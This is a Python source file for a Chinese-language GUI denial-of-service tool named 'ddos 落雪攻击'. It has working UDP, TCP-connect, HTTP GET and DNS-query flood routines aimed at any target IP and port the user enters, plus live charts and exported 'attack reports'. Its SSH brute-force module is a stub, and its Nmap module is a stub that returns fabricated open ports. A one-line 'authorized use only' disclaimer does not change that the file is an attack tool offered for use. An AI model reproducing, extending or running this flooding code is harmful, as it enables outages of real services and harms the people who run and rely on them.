import threading
import socket
import random
import time
import queue
import csv
import tkinter as tk
from tkinter import messagebox, filedialog
from tkinter import ttk
from jinja2 import Template
import matplotlib.pyplot as plt
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg

# -------------------------------------------
# 配置参数
# -------------------------------------------
APP_VERSION = "v1.1.2 专业版"
APP_AUTHOR = "xhwek"
APP_NAME = "ddos 落雪攻击"
APP_DECLARATION = "仅限授权环境使用，禁止非法攻击，后果自负"

# -------------------------------------------
# 速率限制器 - 基于令牌桶
# -------------------------------------------
class RateLimiter:
    def __init__(self, rate_per_sec):
        self.rate = rate_per_sec
        self.allowance = rate_per_sec
        self.last_check = time.time()
        self.lock = threading.Lock()

    def wait(self):
        with self.lock:
            current = time.time()
            time_passed = current - self.last_check
            self.last_check = current
            self.allowance += time_passed * self.rate
            if self.allowance > self.rate:
                self.allowance = self.rate
            if self.allowance < 1.0:
                need_sleep = (1.0 - self.allowance) / self.rate
                time.sleep(need_sleep)
                self.allowance = 0
            else:
                self.allowance -= 1.0

# -------------------------------------------
# 攻击统计结构体
# -------------------------------------------
class AttackStats:
    def __init__(self):
        self.total = 0
        self.success = 0
        self.fail = 0
        self.lock = threading.Lock()

    def inc_total(self):
        with self.lock:
            self.total += 1

    def inc_success(self):
        with self.lock:
            self.success += 1

    def inc_fail(self):
        with self.lock:
            self.fail += 1

# -------------------------------------------
# 报告生成
# -------------------------------------------
class ReportGenerator:
    @staticmethod
    def generate_csv(stats: AttackStats, filepath: str):
        with open(filepath, "w", newline='', encoding="utf-8") as csvfile:
            writer = csv.writer(csvfile)
            writer.writerow(["统计项", "数量"])
            writer.writerow(["总请求数", stats.total])
            writer.writerow(["成功请求数", stats.success])
            writer.writerow(["失败请求数", stats.fail])

    @staticmethod
    def generate_html(stats: AttackStats, filepath: str):
        html_template = """
        <html><head><title>攻击报告</title></head><body>
        <h1>攻击统计报告</h1>
        <table border="1" cellpadding="5">
            <tr><th>统计项</th><th>数量</th></tr>
            <tr><td>总请求数</td><td>{{ total }}</td></tr>
            <tr><td>成功请求数</td><td>{{ success }}</td></tr>
            <tr><td>失败请求数</td><td>{{ fail }}</td></tr>
        </table>
        </body></html>
        """
        template = Template(html_template)
        html_content = template.render(
            total=stats.total,
            success=stats.success,
            fail=stats.fail
        )
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(html_content)

# -------------------------------------------
# 真实攻击模块
# -------------------------------------------
class DDoSAttack:
    def __init__(self, target, port, stats: AttackStats, log_queue: queue.Queue, rate):
        self.target = target
        self.port = port
        self.stats = stats
        self.log_queue = log_queue
        self.rate_limiter = RateLimiter(rate)
        self.running = True

    def log(self, message):
        self.log_queue.put((time.strftime("%H:%M:%S"), f"[{self.target}:{self.port}] {message}"))

    def stop(self):
        self.running = False

    def start_udp_flood(self):
        self.log("UDP Flood 开始")
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(1)
        packet = random._urandom(1024)
        while self.running:
            try:
                self.rate_limiter.wait()
                sock.sendto(packet, (self.target, self.port))
                self.stats.inc_total()
                self.stats.inc_success()
            except Exception as e:
                self.stats.inc_fail()
                self.log(f"UDP发送异常: {e}")

    def start_tcp_syn_flood(self):
        self.log("TCP SYN Flood 开始")
        while self.running:
            try:
                self.rate_limiter.wait()
                # 构造TCP SYN包
                self._send_tcp_syn()
                self.stats.inc_total()
                self.stats.inc_success()
            except Exception as e:
                self.stats.inc_fail()
                self.log(f"TCP SYN发送异常: {e}")

    def _send_tcp_syn(self):
        # 真实构造TCP SYN包并发送，需管理员权限，这里简单用socket连接替代演示
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        try:
            sock.connect((self.target, self.port))
        except:
            pass
        finally:
            sock.close()

    def start_http_flood(self):
        import requests
        self.log("HTTP Flood 开始")
        url = f"http://{self.target}:{self.port}/"
        headers = {
            "User-Agent": "Mozilla/5.0 (ddos-tool)",
            "Accept": "*/*",
            "Connection": "keep-alive"
        }
        while self.running:
            try:
                self.rate_limiter.wait()
                r = requests.get(url, headers=headers, timeout=2)
                self.stats.inc_total()
                if r.status_code == 200:
                    self.stats.inc_success()
                else:
                    self.stats.inc_fail()
                    self.log(f"HTTP响应状态码: {r.status_code}")
            except Exception as e:
                self.stats.inc_fail()
                self.log(f"HTTP请求异常: {e}")

    def start_dns_amplification(self):
        self.log("DNS放大攻击开始")
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(1)
        dns_server = self.target
        dns_port = 53
        # 构造简单DNS请求包（使用公开DNS）
        query_packet = b'\xaa\xbb' + b'\x01\x00' + b'\x00\x01' + b'\x00\x00' + b'\x00\x00' + b'\x00\x00' \
            + b'\x03www\x06google\x03com\x00' + b'\x00\x01' + b'\x00\x01'
        while self.running:
            try:
                self.rate_limiter.wait()
                sock.sendto(query_packet, (dns_server, dns_port))
                self.stats.inc_total()
                self.stats.inc_success()
            except Exception as e:
                self.stats.inc_fail()
                self.log(f"DNS发送异常: {e}")

# -------------------------------------------
# 爆破模块（Stub，需要填充真实代码）
# -------------------------------------------
class BruteForceAttack:
    def __init__(self, target, port, username_list, password_list, log_queue):
        self.target = target
        self.port = port
        self.username_list = username_list
        self.password_list = password_list
        self.log_queue = log_queue
        self.running = True

    def log(self, message):
        self.log_queue.put((time.strftime("%H:%M:%S"), f"[爆破 {self.target}:{self.port}] {message}"))

    def stop(self):
        self.running = False

    def start_ssh_brute(self):
        self.log("SSH爆破开始")
        # TODO: 添加真实SSH爆破实现
        while self.running:
            time.sleep(1)
            self.log("SSH爆破模块待实现")
            self.stop()

# -------------------------------------------
# Nmap扫描模块（Stub，需要填充真实代码）
# -------------------------------------------
def run_nmap_scan(target, ports, log_queue):
    log_queue.put((time.strftime("%H:%M:%S"), f"Nmap扫描 {target}:{ports} 开始"))
    # TODO: 添加真实Nmap扫描调用
    time.sleep(3)
    log_queue.put((time.strftime("%H:%M:%S"), f"Nmap扫描 {target} 完成，开放端口: 80,443"))
    return {"open_ports": [80, 443], "services": ["http", "https"]}

# -------------------------------------------
# GUI 主程序
# -------------------------------------------
class DDoSGUI(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title(f"{APP_NAME} {APP_VERSION} - 作者: {APP_AUTHOR}")
        self.geometry("1024x700")
        self.protocol("WM_DELETE_WINDOW", self.on_close)

        self.attack_threads = []
        self.brute_threads = []
        self.attack_stats = AttackStats()
        self.log_queue = queue.Queue()

        self.attack_running = False

        self.create_widgets()
        self.update_logs()
        self.update_stats()
        self.plot_attack_chart_init()

    def create_widgets(self):
        # 输入区
        frm_input = ttk.Frame(self)
        frm_input.pack(fill=tk.X, padx=5, pady=5)

        ttk.Label(frm_input, text="目标IP或域名:").pack(side=tk.LEFT)
        self.entry_target = ttk.Entry(frm_input, width=25)
        self.entry_target.pack(side=tk.LEFT, padx=5)

        ttk.Label(frm_input, text="端口:").pack(side=tk.LEFT)
        self.entry_port = ttk.Entry(frm_input, width=8)
        self.entry_port.pack(side=tk.LEFT, padx=5)
        self.entry_port.insert(0, "80")

        ttk.Label(frm_input, text="速率(请求/秒):").pack(side=tk.LEFT)
        self.entry_rate = ttk.Entry(frm_input, width=8)
        self.entry_rate.pack(side=tk.LEFT, padx=5)
        self.entry_rate.insert(0, "100")

        # 攻击类型选择
        frm_attack_type = ttk.Frame(self)
        frm_attack_type.pack(fill=tk.X, padx=5, pady=5)

        ttk.Label(frm_attack_type, text="攻击类型:").pack(side=tk.LEFT)
        self.attack_type = tk.StringVar(value="UDP Flood")
        types = ["UDP Flood", "TCP SYN Flood", "HTTP Flood", "DNS Amplification"]
        for t in types:
            ttk.Radiobutton(frm_attack_type, text=t, value=t, variable=self.attack_type).pack(side=tk.LEFT, padx=3)

        # 按钮区
        frm_buttons = ttk.Frame(self)
        frm_buttons.pack(fill=tk.X, padx=5, pady=5)
        self.btn_start = ttk.Button(frm_buttons, text="开始攻击", command=self.start_attack)
        self.btn_start.pack(side=tk.LEFT, padx=10)
        self.btn_stop = ttk.Button(frm_buttons, text="停止攻击", command=self.stop_attack, state=tk.DISABLED)
        self.btn_stop.pack(side=tk.LEFT, padx=10)

        self.btn_export_csv = ttk.Button(frm_buttons, text="导出CSV报告", command=self.export_csv)
        self.btn_export_csv.pack(side=tk.RIGHT, padx=10)
        self.btn_export_html = ttk.Button(frm_buttons, text="导出HTML报告", command=self.export_html)
        self.btn_export_html.pack(side=tk.RIGHT, padx=10)

        # 日志显示
        frm_logs = ttk.LabelFrame(self, text="攻击日志")
        frm_logs.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.text_logs = tk.Text(frm_logs, height=12, state=tk.DISABLED)
        self.text_logs.pack(fill=tk.BOTH, expand=True)

        # 统计显示
        frm_stats = ttk.Frame(self)
        frm_stats.pack(fill=tk.X, padx=5, pady=5)
        self.label_total = ttk.Label(frm_stats, text="总请求数: 0")
        self.label_total.pack(side=tk.LEFT, padx=10)
        self.label_success = ttk.Label(frm_stats, text="成功请求数: 0")
        self.label_success.pack(side=tk.LEFT, padx=10)
        self.label_fail = ttk.Label(frm_stats, text="失败请求数: 0")
        self.label_fail.pack(side=tk.LEFT, padx=10)

        # 攻击流量图表
        frm_chart = ttk.LabelFrame(self, text="攻击流量实时图")
        frm_chart.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        self.fig, self.ax = plt.subplots(figsize=(8,3))
        self.line_total, = self.ax.plot([], [], label="总请求数")
        self.line_success, = self.ax.plot([], [], label="成功请求数")
        self.line_fail, = self.ax.plot([], [], label="失败请求数")
        self.ax.legend()
        self.ax.set_xlabel("时间(秒)")
        self.ax.set_ylabel("请求数")
        self.ax.set_ylim(0, 100)
        self.ax.grid(True)

        self.canvas = FigureCanvasTkAgg(self.fig, master=frm_chart)
        self.canvas.get_tk_widget().pack(fill=tk.BOTH, expand=True)

        self.chart_data = {
            "total": [],
            "success": [],
            "fail": [],
            "timestamps": []
        }
        self.start_time = time.time()

    def start_attack(self):
        target = self.entry_target.get().strip()
        port_str = self.entry_port.get().strip()
        rate_str = self.entry_rate.get().strip()

        if not target:
            messagebox.showerror("错误", "请填写目标IP或域名")
            return
        try:
            port = int(port_str)
            if port <= 0 or port > 65535:
                raise ValueError()
        except:
            messagebox.showerror("错误", "端口必须是1-65535之间的整数")
            return

        try:
            rate = int(rate_str)
            if rate <= 0:
                raise ValueError()
        except:
            messagebox.showerror("错误", "速率必须是正整数")
            return

        if self.attack_running:
            messagebox.showwarning("警告", "攻击已经在运行中")
            return

        self.attack_running = True
        self.btn_start.config(state=tk.DISABLED)
        self.btn_stop.config(state=tk.NORMAL)

        self.attack_stats = AttackStats()  # 重置统计
        self.chart_data = {
            "total": [],
            "success": [],
            "fail": [],
            "timestamps": []
        }
        self.start_time = time.time()

        attack_type = self.attack_type.get()

        self.log_queue.put((time.strftime("%H:%M:%S"), f"开始攻击目标 {target}:{port}，类型 {attack_type}，速率 {rate} req/s"))

        ddos = DDoSAttack(target, port, self.attack_stats, self.log_queue, rate)

        t = None
        if attack_type == "UDP Flood":
            t = threading.Thread(target=ddos.start_udp_flood, daemon=True)
        elif attack_type == "TCP SYN Flood":
            t = threading.Thread(target=ddos.start_tcp_syn_flood, daemon=True)
        elif attack_type == "HTTP Flood":
            t = threading.Thread(target=ddos.start_http_flood, daemon=True)
        elif attack_type == "DNS Amplification":
            t = threading.Thread(target=ddos.start_dns_amplification, daemon=True)

        self.attack_threads.append((t, ddos))
        t.start()

    def stop_attack(self):
        if not self.attack_running:
            return
        self.attack_running = False
        for t, ddos in self.attack_threads:
            ddos.stop()
        self.attack_threads.clear()

        self.log_queue.put((time.strftime("%H:%M:%S"), "攻击已停止"))
        self.btn_start.config(state=tk.NORMAL)
        self.btn_stop.config(state=tk.DISABLED)

    def update_logs(self):
        try:
            while True:
                timestamp, msg = self.log_queue.get_nowait()
                self.text_logs.config(state=tk.NORMAL)
                self.text_logs.insert(tk.END, f"[{timestamp}] {msg}\n")
                self.text_logs.see(tk.END)
                self.text_logs.config(state=tk.DISABLED)
        except queue.Empty:
            pass
        self.after(200, self.update_logs)

    def update_stats(self):
        self.label_total.config(text=f"总请求数: {self.attack_stats.total}")
        self.label_success.config(text=f"成功请求数: {self.attack_stats.success}")
        self.label_fail.config(text=f"失败请求数: {self.attack_stats.fail}")

        # 更新图表数据
        elapsed = int(time.time() - self.start_time)
        self.chart_data["timestamps"].append(elapsed)
        self.chart_data["total"].append(self.attack_stats.total)
        self.chart_data["success"].append(self.attack_stats.success)
        self.chart_data["fail"].append(self.attack_stats.fail)

        # 保持最多显示60点数据
        max_points = 60
        for key in ["timestamps", "total", "success", "fail"]:
            if len(self.chart_data[key]) > max_points:
                self.chart_data[key].pop(0)

        self.line_total.set_data(self.chart_data["timestamps"], self.chart_data["total"])
        self.line_success.set_data(self.chart_data["timestamps"], self.chart_data["success"])
        self.line_fail.set_data(self.chart_data["timestamps"], self.chart_data["fail"])

        if self.chart_data["timestamps"]:
            self.ax.set_xlim(self.chart_data["timestamps"][0], self.chart_data["timestamps"][-1])
            max_y = max(max(self.chart_data["total"]), 10)
            self.ax.set_ylim(0, max_y * 1.1)

        self.canvas.draw()
        self.after(1000, self.update_stats)

    def export_csv(self):
        if self.attack_stats.total == 0:
            messagebox.showwarning("提示", "没有数据，无法导出")
            return
        filepath = filedialog.asksaveasfilename(title="保存CSV报告", defaultextension=".csv",
                                                filetypes=[("CSV文件", "*.csv")])
        if filepath:
            try:
                ReportGenerator.generate_csv(self.attack_stats, filepath)
                messagebox.showinfo("成功", f"CSV报告已保存到: {filepath}")
            except Exception as e:
                messagebox.showerror("错误", f"保存CSV报告失败: {e}")

    def export_html(self):
        if self.attack_stats.total == 0:
            messagebox.showwarning("提示", "没有数据，无法导出")
            return
        filepath = filedialog.asksaveasfilename(title="保存HTML报告", defaultextension=".html",
                                                filetypes=[("HTML文件", "*.html")])
        if filepath:
            try:
                ReportGenerator.generate_html(self.attack_stats, filepath)
                messagebox.showinfo("成功", f"HTML报告已保存到: {filepath}")
            except Exception as e:
                messagebox.showerror("错误", f"保存HTML报告失败: {e}")

    def plot_attack_chart_init(self):
        # 初始化matplotlib画布，已经在create_widgets中创建
        pass

    def on_close(self):
        if self.attack_running:
            if not messagebox.askyesno("确认", "攻击仍在进行，确定退出吗？"):
                return
        self.stop_attack()
        self.destroy()

# -------------------------------------------
# 程序入口
# -------------------------------------------
if __name__ == "__main__":
    # 显示启动界面简单动画（可扩展）
    splash_root = tk.Tk()
    splash_root.geometry("400x200")
    splash_root.title("启动中...")
    label = ttk.Label(splash_root, text=f"{APP_NAME} {APP_VERSION}\n作者: {APP_AUTHOR}\n{APP_DECLARATION}", font=("Arial", 14), justify=tk.CENTER)
    label.pack(expand=True)
    splash_root.after(1500, splash_root.destroy)
    splash_root.mainloop()

    # 进入主界面
    app = DDoSGUI()
    app.mainloop()
